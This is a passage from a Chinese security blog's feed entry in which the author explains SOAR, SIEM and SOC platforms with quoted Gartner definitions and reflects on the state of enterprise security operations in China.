href="https://www.gartner.com/en/information-technology/glossary/security-orchestration-automation-response-soar">它的词条定义</a>是：</p><blockquote><p>SOAR refers to technologies that enable organizations to collect inputs monitored by the security operations team. For example, alerts from the SIEM system and other security technologies — where incident analysis and triage can be performed by leveraging a combination of human and machine power — help define, prioritize and drive standardized incident response activities. SOAR tools allow an organization to define incident analysis and response procedures in a digital workflow format.</p></blockquote><blockquote><p>SOAR指的是一种可以让组织收集由安全运营团队所监控的输入的技术。例如，来自SIEM系统和其他安全技术的警报有助于定义、确定优先级并驱动标准化的事件响应活动，在这些安全技术中，可以利用人力和机器的力量来执行事件分析和分类。SOAR工具允许组织以数字工作流格式定义事件分析和响应程序。<br>（机翻）</p></blockquote><p>可以看出这是一个很空洞而又宽泛的概念，后续Gartner又对其进行了不少的修补，最重要的是两篇报告：<br><a href="https://www.gartner.com/en/documents/3860563" title="这篇文章需要成为Gartner的客户才能看，而且我没找到别的可以看的方式">Preparing Your Security Operations for Orchestration and Automation Tools</a><br><a href="https://www.gartner.com/en/documents/3990720" title="这篇我倒是找到了可以看的地方">Market Guide for Security Orchestration, Automation and Response Solutions</a></p><p>第一篇文章对SOAR进行了很详细的定义与指导，但是我没有找到可以免费看这篇文档的地方，所以这里我只能放出它的目录来:</p><blockquote><p>Analysis</p><ul><li>Defining SOAR</li><li>SOAR Drivers and Enablers<ul><li>SOAR for Security Staff Productivity</li><li>Additional SOAR Drivers</li><li>SOAR Enablers</li></ul></li><li>SOAR Use Cases<ul><li>Detection and Triage Use Cases</li><li>Incident Response Use Cases</li><li>Threat Intelligence Use Cases</li><li>Detailed Use Case Example: Phishing Email Handling</li></ul></li><li>SOAR Technologies in Depth<ul><li>Workflow and Collaboration Engine</li><li>Case and Ticket Management</li><li>Orchestration and Automation</li><li>Threat Intelligence Management</li><li>Other Components and Capabilities</li></ul></li><li>SOAR Architecture<ul><li>Differences Between Existing SOAR Tool Categories</li></ul></li><li>SOAR Future</li><li>Strengths</li><li>Weaknesses  </li></ul><p>Guidance</p><ul><li>Decide on the Need and Readiness for SOAR</li><li>Build a Business Case for SOAR</li><li>Select the Right SOAR Tool for You</li><li>Test the SOAR Tools</li><li>Align Skills Needed for SOAR Success</li><li>Deploy the SOAR Technology</li><li>Use SOAR Tools Effectively</li><li>Expand and Evolve Your SOAR Deployment</li></ul><p>The Details<br>Gartner Recommended Reading</p></blockquote><p>从这里我们可以看出这篇报告已经涵盖了整个SOAR的定义、应用场景和使用案例，我们可以认为这篇报告确实配得上它自称的”our amazing SOAR paper”。所以我也对它非常好奇，如果有谁可以分享给我满足一下好奇心，那可真是非常感谢了。</p><p>再参考一些侧面描述SOAR的文章，如：</p><p><a href="https://securityintelligence.com/posts/whats-new-2020-gartner-market-guide-soar-solutions/">https://securityintelligence.com/posts/whats-new-2020-gartner-market-guide-soar-solutions/</a><br><a href="https://www.dflabs.com/resources/blog/gartner-soar-magic-quadrant-the-best-of-incman-soar-is-yet-to-come/">https://www.dflabs.com/resources/blog/gartner-soar-magic-quadrant-the-best-of-incman-soar-is-yet-to-come/</a><br><a href="https://blog.technologent.com/gartner-soar-model-future-it-security">https://blog.technologent.com/gartner-soar-model-future-it-security</a></p><p>现在我们可以用自己的话来对其进行一个描述了：SOAR平台是以workflow（工作流）和playbook（剧本）为核心的安全运营中心，它更强调了自动化判断报警级别的作用，并以playbook为核心设置了自动化流程。</p><p>从这个意义上我们可以发现SOAR的概念非常眼熟，不管是SIEM还是SOC都与之有一些相似性，但是又各有各强调的点。这也是安全方面概念的一些难点：几乎没有突破性的进展，更多是面对某些情况的修补和适配。（这里可以多说几句，最近几年安全方面强推零信任，安全设备换着名字翻新，而实际上几乎没有技术性的突破。这感觉真是太荒谬了，一方面是red team的技术和工具不断革新换代，利用点从框架漏洞转向侧信道再跳到代码审计上的0day漏洞，利用难度逐渐下降，攻击点越来越多。而blue team呢？不断纠结几个小的点的更新，从零信任到蜜罐到SOAR，不断缝缝补补最新的漏洞，俨然一副”安全的大厦已经建成，之后只需要小修小补”的姿态，最后甚至开始从制度上收紧，我不得不怀疑安全方向未来的发展。</p><h2 id="让我们更进一步，SOAR和SIEM还有SOC之间有什么关联呢？"><a href="#让我们更进一步，SOAR和SIEM还有SOC之间有什么关联呢？" class="headerlink" title="让我们更进一步，SOAR和SIEM还有SOC之间有什么关联呢？"></a>让我们更进一步，SOAR和SIEM还有SOC之间有什么关联呢？</h2><p>那么让我们先来看一下，什么是SIEM，什么是SOC：</p><blockquote><p>SIEM (安全信息和事件管理)是软件和服务的组合，是SIM（安全信息管理）和SEM（安全事件管理）的融合体。两者的区别在 于SEM侧重于实时监控和事件处理方面，SIM侧重历史日志分析和取证方面。SIEM为来自企业和组织中所有IT资源（包括网络、系统和应用）产生的安全信息（包括日志、告警等）进行统一的实时监控、历史分析，对来自外部的攻击行为和内部的违规、误操作行为进行监控、审计分析、调查取证、出具各种报表报告，实现IT资源合规性管理的目标，同时提升企业和组织的安全运营、威胁管理和应急响应能力。</p></blockquote><blockquote><p>SOC平台，网络安全管理平台。<br>提供集中、统一、可视化的安全信息管理，通过实时采集各种安全信息，动态进行安全信息关联分析与风险评估，实现安全事件的快速跟踪、定位和应急响应。<br>从监控、审计、风险和运维四个维度建立起来的一套可度量的统一业务支撑平台。</p></blockquote><p>从中可以看出，如果以中国的安全设备习惯来说，SIEM更多地接近<strong>日志审计平台</strong>，各大安全厂商都有这个产品，集中所有的日志对其进行分析（一般是分布式部署），同时可以解决掉等保的日志相关的合规要求。在使用中我用过启明星辰的泰合日志审计平台和360的日志审计中心，还有诸如graylog一类的开源日志平台。它们的主要功能很相似：从各个设备（不局限于安全设备）上发送日志和告警到自己这里，对其进行解析，归纳（有些可以分析），资产发现。一般不会具有响应动作。</p><p>而SOC平台，更多地是作为一个集中化的处理中心。它从日志审计中心中读取流量，然后进行分析，归纳，总结。以国内的产品来说，大部分厂商的态势感知平台都是为了这个目的而生的——————一个可以产生警报，调取日志，查询入侵路径的运营中心。这个中心需要部分安全人员值守，这也就是安全运维主要驻场的地方了。</p><p><strong>而SOAR，更多地是作为一个SOC的+1版本，为了解决企业使用SOC平台方案后需要大量人力值守的情况，于是自动化就变成了一个新的需求点，SOAR也是为了解决这个需求而应运而生的。SOAR从SIEM中提取日志（是的SOC平台也需要从SIEM中提取日志），如果日志触发了SOAR的剧本的开始 条件，就会开始执行这个剧本。举例来说，某个xxx设备的xxx告警日志会触发我设定好的告警剧本，那么当SOAR平台收到这个告警日志，就会开始执行剧本的后续环节，例如发送警报到邮箱或是钉钉提醒。</strong></p><h2 id="短暂休息一下，让我们聊聊目前的安全现状。"><a href="#短暂休息一下，让我们聊聊目前的安全现状。" class="headerlink" title="短暂休息一下，让我们聊聊目前的安全现状。"></a>短暂休息一下，让我们聊聊目前的安全现状。</h2><p>在几年的安全工作中也大概地理解到了安全工作的尴尬。在过去我能想到的无非是：安全本身并不产生收益，但是却会消耗资源，所以各大公司都不愿意加大安全预算。</p><p>从现在的角度看起来这种想法并不能算错，但是委实太粗浅了一些。企业在安全方面的投资在我看来更像是一种”降低受灾概率”的存在。安全设备并不像备份设备一样能够为灾难或是数据丢失兜底，所有安全厂商都会告诉公司，你的系统有很多安全风险，只要购买了我们的xxxx，公司的网络系统就安全了。但是事实是，即使你购买了全套的安全设备，从防火墙到waf到日志审计到防病毒到态势感知到蜜罐…全部上上去，你的系统依然有可能被正面攻破/迂回潜入，你的数据依然有可能会被窃取。</p><p>那么企业在这样的环境下，又凭什么花费大力气在安全上呢？</p><p>安全建设从来都需要”由上而下”的力量作为第一推动力，否则企业不可能付出大的投入去做安全。而国内常见的安全现状是什么呢：甲方公司出于合规性的要求去做安全建设；甲方公司领导被乙方洗脑决定推动安全建设来解决自身的安全问题。后者当然比前者要来得更主动，更有决心，更有效果。但是在工作中我见过的后者公司，一只手都能数的过来。</p><p>目前的国内公司的安全情况可以从安全投入来讲粗浅地分为三类：</p><ul><li>几乎没有安全投入的公司，这类公司一般是初创公司或者小的实业公司，没有太大的网络业务，官网就挂一个静态页面或者随便找外包用框架做一些展示页，维护当然更无从谈起。大部分脚本小子的练手方式就是baidu/google hack这些公司的官网。</li><li>稍微有一些安全投入的公司，有一些基础的安全设备如防火墙，waf。可能外包了安全业务给某些小的集成公司或是自己有几个专职安全的IT人员。这些大多是政府机关或是特殊行业公司，让他们对安全方面加大投入的大部分推动力是合规要求。最近几年的hw与等保让这些公司不得不加大在安全上的投入，从结果上来看确实有作用，但是从实际上来看也只能防一些小蟊贼，但是对于稍微深入的大哥还是效果有限。（今年9月1日施行的《关键信息基础设施安全保护条例》禁止了对信息基础设施的扫描，这可以有效地防范来自国内的攻击，然而对于国外的黑客依然无力）</li><li> 安全措施很妥当的公司，每年有不错的安全预算，一整只安全团队，安全设备样样齐全，安全管理制度合理。这样的公司大多是实权单位或是大型企业，也是HW中能坚持到最后几轮的公司。</li></ul><p>但是从结果上来看，这三种公司并没有本质性的差别，在hw中，这三类公司都可能在第一轮被打穿；而在实际中，我见过一则通报，一个地级市的医院单位（第二类）和一家大型企业（第三类）同样遭受了病毒攻击，当时领导开玩笑地问我：你说他们投入在安全方面的预算起作用了吗？</p><p>我哑口无言。</p><p>blue team先天上的弱点是，攻击永远比防御要简单，但我并不同意“防御就应该只是修修补补”这种说法。red team正在发掘更多的攻击面，更多的漏洞，更多的工具，形式依然是严峻的。是，最近几年在HW的压力下政府机关的安全投入在不断提高，防御方不断地在修补漏洞，攻击的成本越来越高，看起来成效喜人，可背后是更大的安全运维压力和安全管理压力。头疼医头，脚疼医脚，纵然在IT方面的准则是“没有银弹”，但这种叠补丁式的安全防御法迟早会决堤。</p><p>防御方需要一个能够一锤定音式的方法，一种能够解决掉大部分问题的集中化安全中心，但不是SOC，至少不是现在的SOC。SOAR和它的概念接近，但我更看好态势感知的预判功能的后续进展。目前的安全管理类的平台在我看来是纯粹需要人力去堆砌，希望态势感知的发展可以逐步缓解这种安全现状。</p><h2 id="最后，让我们来谈谈SOAR的现状和展望"><a href="#最后，让我们来谈谈SOAR的现状和展望" class="headerlink" title="最后，让我们来谈谈SOAR的现状和展望"></a>最后，让我们来谈谈SOAR的现状和展望</h2><p>说回来，SOAR的出现本身就是为了解决安全运维的压力，但是它的特点——————workflow和playbook作为自动化流程，在我看来现阶段无非是实现流程控制，远远谈不上自动化。（在这里更要吐槽一下安全厂商的假概念，所谓大数据，人工智能，在安全方面的使用比例连画饼都算不上。）</p><p>放眼到全球，我们也可以从<a href="https://content.siemplify.co/gartner-market-guide-2020/2020-gartner-market-guide-for-security-orchestration-automation-and-response-solutions">Gartnar在2020年发布的SOAR市场报告</a>中可以看到这么一段：</p><blockquote><p>SOAR tools are still primarily leveraged by organizations with a security operations center. Use cases to support security operations beyond threat monitoring and detection, threat intelligence, and incident response and threat hunting are still nascent.</p></blockquote><blockquote><p>SOAR 工具仍然主要由拥有安全运营中心的组织使用。除了威胁监控和检测、威胁情报、事件响应和威胁搜寻之外，用于支持安全操作的用例仍处于起步阶段。 </p></blockquote><p>很显然，SOAR目前在商业上是用作SOC的作用，其自动化特点在逐步完善，但是其安全操作的特点还没有被开发，这应该是它下一步的发展方向。安全运维的流程无非是：查看日志-发现问题-确认问题-处理问题，SOAR现阶段如果能实现帮忙在查看日志之前做一些筛选工作已经足矣，安全运维的压力大多也是在茫茫多的报警日志中去寻找真实的攻击事件，误报严重这件事从根上就不应该让SOAR来解决，而应该从底层，从安全设备的角度来处理。</p><p>前段时间看到了国内安全从业者的一段话，我感觉很受启发，作为结束语正合适:<a href="https://zhuanlan.zhihu.com/p/45098402">关于SOC安全运营中心的理解是多种多样的，有人把它定义为一套包罗万象的安全系统，在系统的基础上，增加一套安全人马来使用SOC系统；有人把它定义为一个安全体系理念，围绕理念，采购产品，添加人员；也有人把它定义为一个部门，例如，安全部=安全运营中心SOC=安全响应中心SRC=安全运营与响应中心SORC。围绕这个SOC部门，配备设备、技术、管理要求；我们不纠结于哪个定义，但要理解，在SOC中，人、技术、管理缺一不可，否则SOC将不能实现O（operation）运营的效果，从而导致失败；</a></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这篇文章断断续续写了一周，思路和逻辑都很散漫，我很不满意，但是应该也不会修改了。</p><p>希望几年后的我能够对这些概念有更多的思考。</p>]]></content>
    
    
    <summary type="html">本文描述了在工作中接触到SOAR平台后关于SOAR平台的一些粗浅思考，主要为SOAR、SOC、SIEM等安全相关内容。</summary>
    
    
    
    <category term="安全运营" scheme="http://ciaofox.me/categories/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/"/>
    
    
    <category term="安全运营" scheme="http://ciaofox.me/tags/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/"/>
    
  </entry>
  
</feed>
